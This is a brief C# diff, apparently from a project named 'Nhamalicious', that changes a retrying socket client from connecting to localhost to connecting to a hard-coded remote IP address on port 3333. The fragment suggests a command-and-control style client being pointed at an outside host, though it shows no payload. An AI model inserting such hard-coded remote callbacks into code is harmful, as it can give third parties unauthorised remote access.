@@ -36,7 +36,7 @@ namespace Nhamalicious.Resources.Code
                 {
                     attempts++;
                     // Change IPAddress.Loopback to a remote IP to connect to a remote host.
-                    clientSocket.Connect(IPAddress.Loopback, 3333);
+                    clientSocket.Connect("94.61.37.44", 3333);
                 }
                 catch (SocketException)
                 {
